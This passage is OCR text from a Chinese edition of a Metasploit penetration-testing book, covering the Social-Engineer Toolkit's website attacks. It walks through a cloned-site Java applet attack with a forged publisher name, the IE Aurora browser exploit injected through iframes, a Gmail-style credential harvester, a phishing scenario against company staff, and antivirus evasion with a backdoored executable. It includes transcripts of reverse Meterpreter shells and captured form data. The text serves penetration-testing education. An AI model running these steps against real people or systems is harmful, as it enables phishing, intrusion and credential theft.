的预先配置好的攻击模板。
10.3Web攻击向量
Web攻击向量有可能是SET中最先进和令人兴奋的部分，因为它会特意构造出一些对目标
而言是可信且具有诱惑力的网页。SET可以克隆出和实际运行的可信站点看起来完全一样的网
页，这使得受害者认为他们正在浏览一个合法站点。
10.3.1Java Applet
Java applet攻击是SET中最成功的攻击向量之一，这个applet是SET的一位开发者Thomas
Werth所创建的。该攻击引入了恶意Java applet程序进行智能化的浏览器检查，确保applet能在
目标浏览器正确运行，同时也能在目标主机运行攻击载荷。Javaapplet攻击并不被认为是Java
本身的漏洞，当受攻击目标浏览恶意网页的时候，网页会弹出一个警告，问他是否需要运行一
个不被信任的Java applet。因为Java允许你对一个applet选择任意名字进行签名，你可以叫它
的发布者是Google、Microsoft或其他你所选择的字符串。通过修改set_config文件，并将
WEBATTACK_EMAIL标志位开启，你可以在群发邮件中引I入这种攻击方式。
N
让我们举一个真实世界的案例一对个财富1000强企业网络的渗透测试。首先，伪造一
个与该公司实际网页相似的域名并进行注册。其次，攻击者通过Metasploit的harvester模块在
互联网上搜索后缀为@.com的邮件地址。在公共网页找到了200个邮件地址之后，
利用群发邮件系统发送到这200个邮箱之中。该攻击邮件声称来自于公司的通信部门，并要求
142
---
## Page 170
第10章社会工程学工具包
公司员工浏览公司设计的新网页。每封邮件都带有各个收件人的姓名，并且声称只要员工点击
链接，就可以在公司首页上看到自己的照片，新网页上公布的员工照片是对他们辛勤工作的最
好证明。好奇和恐惧会成为每个目标用户立刻点击链接的首要因素。
在目标用户点击链接之后，一个Javaapplet通知框弹了出来，并显示该Java applet是用该
公司名所签署。由于该程序看似是一个合法程序，目标用户便点击运行该程序。然而，这个命
令将执行嵌入在伪造域名下克隆网页中的恶意Java applet。尽管用户没有看到他们的照片，他
们还是可以看到一个看似合法的网站，同时没有意识到自己的主机已经被控制。当目标点击Java
applet安全警告框中的运行按钮后，一个攻击载荷就会被执行，攻击者便会得到目标主机的shell。
一旦攻击载荷成功执行，目标主页就会被重定向到合法网站上，以保证攻击不会被轻易发现。
视觉效果上和原来的网站没有任何区别。通过如下命令，我们可以看到SET是如何在伪造站点
（http://www.secmaniac.com）上部署攻击的：
root@bt:/pentest/exploits/set#./set
Selectfrom the menu:
0 2. Website Attack Vectors
Enteryour choice:2
@ 1. The Java Applet Attack Method
Enter your choice(press enter for default):1
The first method will allow SET to import a list of pre-defined
webapplicationsthatitcanutilizewithintheattack.
The second method will completely clone a website of your choosing
and allow you to utilize the attack vectors within the completely
samewebapplicationyouwereattemptingtoclone.
The third method allows you to import your own website, note that you
should only have an index.html when using the import website
functionality.
[!]website AttackVectors[!]
1.Web Templates
 2.Site Cloner
3.Custom Import
4.Return to main menu
Enter number (1-4):2
143
---
## Page 171
Metasploit渗透测试指南
SET supports both HTTP and HTTPS
Example:http://www.thisisafakesite.com
①Enter the urltoclone:http://www.secmaniac.com
[*]Cloning thewebsite:http://www.secmaniac.com
[*]This couldtake alittlebit...
[*]Injecting Java Applet attack into the newly cloned website.
[*]Filename obfuscation complete.Payloadnameis:OxvV3cYfbLBI3
[*]Maliciousjavaappletwebsitepreppedfordeployment
开始这次攻击场景，我们从SET主菜单中选择了Web攻击向量O，使用Javaapplet攻击
方法?，同时在子选项中选择网页克隆③的方式。最后，输入SET需要克隆的网站域名·。
Whatpayloaddoyouwanttogenerate:
Name:
Description:
2.Windows Reverse_TCP Meterpreter
Spawn a meterpreter shell on victim and sei
back to attacker.
OEnter choice (hit enter for default):
Belowis a list of encodings to try and bypass AV.
Select one of thebelow,‘backdoored executable′is typically the best.
16.Backdoored Executable (BEST)
@ Enter your choice (enter for default):
[-]Enter the PoRT of the listener(enter for default):
[-]Backdooringalegitexecutable tobypassAnti-Virus.Waitafewseconds..
[-]Backdoor completedsuccessfully.Payloadis nowhiddenwithinalegitexecutable.
Do you want to create a Linux/0sx reverse_tcp payload
intheJava Appletattackaswell?
********************************************************
Enter choice yes or no:no
WebServer Launched.Welcome to the SETWebAttack.
***************************************************
[--] Tested on IE6,IE7,IE8,Safari,Chrome,and FireFox [--]
[*]Launching MSF Listener..
[*] This may take a few to load MSF...
144
---
## Page 172
第10章社会工程学工具包
与SET中其他攻击方法中一样，攻击者可以选择其他攻击载荷，默认的Meterpreter反向攻
击载荷①通常是一个不错的选择。在这个攻击场景中，当选择编码方式和回连端口的时候，攻
击者可以直接选择默认选项?。在所有配置完成之后，SET启动Metasploit：
resource(src/program_junk/meta_config)>exploit-j
[*]Exploit running as background job.
O[*]Startedreversehandler on 10.10.1.112:443
[*]Starting the payload handler...
msf exploit(handler)>
Set设置了metasploit的必要选项，最后在443端口等待meterpreter回连0。
提示：你已经创建了一个克隆了http://www.secmaniac.com/网页的Web服务器，如果你
修改配置文件并开启了WEBATTACK_EMAIL，SET会提示你使用针对钧鱼攻击向量，并发
出了一份攻击邮件。
现在，一切就绪，你只要简单地把目标用户吸引到恶意网页上。当浏览到这个网页后，目
标会看到一个由微软发布的弹出警示框，如图10-2所示，如果目标用户点击运行该弹出框，而
且绝大多数目标用户都会这么做，那么攻击载荷就会运行，你就会得到目标主机的控制权。
提示：SET允许攻击者使用任何想用的名字对JavaApplet签名，当目标点击运行的同时
攻击载荷执行后，目标的浏览器将重定向到合法的secmaniac网站上
Sec
Warning-Security
+
The application's digital signature cannot beverified.
Doyou want torun theapplication?
Name:
Java
Publisher:Microsoft
From:
http://172.16.32.137
Always trustcontent from this pubisher
图10-2JavaApplet弹出框
145
---
## Page 173
Metasploit渗透测试指南
回到我们的攻击机，Meterpreter攻击会话已经成功建立，我们现在可以像如下所示的那样
来访问目标主机了。
msf exploit(handler)>sessions -i1
[*]Starting interaction with 1...
shellmeterpreter > shell
Process 28o0 created,
Channel 1 created.
MicrosoftWindows XP[Version5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\Documentsand Settings\Administrator\Desktop>
10.3.2客户端Web攻击
SET还可以利用客户端Web渗透攻击模块。在这个案例中，我们将替代展示给目标用户的
Java applet，而使用Metasploit中直接引入的客户端渗透代码，来对目标系统实施攻击。要使用
客户端渗透攻击，你必须前期进行侦查或者知道目标系统中存在某种可能的漏洞，这种方法特
别适合Oday攻击：只要一个针对Oday漏洞的渗透代码出现在Metasploit中，那么通常可以在
几小时内就可以利用SET进行测试与发布了。
在这个例子中，我们将重复上面那个攻击场景，但是我们将使用客户端攻击，客户端攻击
主要针对目标浏览器的漏洞。SET中的绝大多数攻击都是针对IE浏览器的，当然，针对Firefox
浏览器的攻击也存在，但数量较少且应用范围并不广泛。在这个案例中，我们将使用曾用来攻
击Google的Aurora攻击向量。开始阶段，输入如下命令：
root@bt:/pentest/exploits/set#./set
Selectfrom the menu:
02.Website Attack Vectors
Enter your choice: 2
@ 2. The Metasploit Browser Exploit Method
Enter your choice (press enter for default):2
[!]Website Attack Vectors[!]
③ 2.Site Cloner
Enter number (1-4):2
SETsupports both HTTP and HTTPS
Example:http://www.thisisafakesite.com
Entertheurltoclone:http://www.secmaniac.com
146
---
## Page 174
第10章社会工程学工具包
在SET主菜单中选择Web攻击向量O，之后选择Metasploit浏览器攻击方法?，进一一步
选择网页克隆选项③，输入你想要克隆的网站http://www.semcmaniac.com?。一旦网站被克隆，
我们将建立目标用户点击时所触发的漏洞渗透代码。
Enter thebrowser exploityou wouldliketouse
0 16.Microsoft Internet Explorer "Aurora'
Enter your choice (1-23)(enter for default):16
whatpayloaddoyouwanttogenerate:
Name:
Description:
2.Windows Reverse_TCP Meterpreter
Spawn a meterpreter shell on victimand send
back to attacker.
? Enter choice (example 1-1o) (Enter for default):
Enter the port to use for the reverse (enter for default):
[*]Cloning the website:http://www.secmaniac.com
[*]This could take a little bit...
[*] Injecting iframes into cloned website for MSF Attack....
[*] Malicious iframe injection successful...crafting payload.
[*]Launching MSF Listener...
[*]Thismay take a few toload MSF...
resource(src/program_junk/meta_config)>exploit-j
[*]Exploit running asbackground job:
msfexploit(ms10_002_aurora)>
[*]Started reverse handler on 10.10.1.112:443
[*]Using URL:http://0.0.0.0:8080/
[*]Local IP:http:// 10.10.1.112:8080/
[*]Server started.
选择一种你想使用的客户端攻击漏洞，来最后完成整个攻击部署过程。根据上面所述，我
们选择著名的IEAurora漏洞渗透模块O，同时按回车·使用默认的Meterpreter反弹式攻击载
荷和配置选项。
当目标浏览到http://www.secmaniac.com时，网页看似正常，但是实际上，自标系统已经通
过框架（iframe）注入控制了该主机。SET自动对克隆网页进行了修改，包含了一个不可见的
框架代码，来实施客户端攻击。
回到攻击机上，攻击者会发现攻击已经成功了。Meterpreter从目标到攻击机的控制连接会
话已经建立，我们能够完全控制目标主机。如下所示：
147
---
## Page 175
Metasploit渗透测试指南
msf exploit(handler)>
[*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -> 10.10.1.102:58412)
msf exploit(handler)>sessions-i1
[*]Starting interaction with 1...
shellmeterpreter>shell
Process 2819created.
Channel 1 created.
Microsoft Windows XP[Version 5.1.2600]
(C)Copyright 1985-2001Microsoft Corp.
C:\Documents and Settings\Administrator\Desktop>
10.3.3用户名和密码获取
在前面的例子中，我们的目标是获取了单台主机的控制权限。SET中的一个相对较新的功
能是，它不仅具有克隆网页的功能，而且还能够获取登录网页用户的敏感信息。在下一个例子
中，SET将克隆Gmail的登录界面，同时自动重写POST方法，先把信息POST到SET设置的
网页服务器上进行窃取，而后再重定向到合法网站上。
03.CredentialHarvesterAttack Method
Enter your choice (press enter for default): 3
[!]Website AttackVectors[!]
92.Site Cloner
Enter number (1-4):2
Email harvester will allowyou toutilize the clone capabilities within SET
toharvestcredentials or parameters from awebsiteaswellasplace theminto
a report.
SET supports both HTTP and HTTPS
Example:http://www.thisisafakesite.com
③Enter theurltoclone:http://www.secmaniac.com
Press{return}to continue.
[*]Social-EngineerToolkit CredentialHarvesterAttack
[*]Credential Harvester is running on port 80
[*]Information will be displayed to you as it arrives below:
148
---
## Page 176
第10章社会工程学工具包
在选择了Web攻击向量①和获取机密信息的选项后，选择网页克隆选项?。这个攻击需要
的配置非常的少，仅需要将你想要克隆的网页URL（http://www.secmaniac.com）③输入到SET
中，当然该网页需要包含有登录表单。
网页服务器运行并等待目标响应。正如前面所提到的，你可以在这种情况下打开Web
攻击选项（WEBATTACK_CONFIG=ON），同时SET会提示你是否需要群发邮件来欺骗目
标点击链接。一个和Gmail登录页面一模一样的页面将会展现在目标用户面前。当目标用
户输入它的密码后，网页会自动重定向到原始正常的Gmail页面，同时以下信息将被发送
给攻击者。
10.10.1.102--"GET/HTTP/1.1"200-
[*]WE GOTA HIT!Printing the output:
PARAM:1tmpl=default
PARAM:1tmplcache=2
PARAM: continue=https://mail.google.com/mail/?
PARAM: service=mail
PARAM: rm=false
PARAM:dsh=-1174166214807618980
PARAM: 1tmpl=default
PARAM: ltmpl=default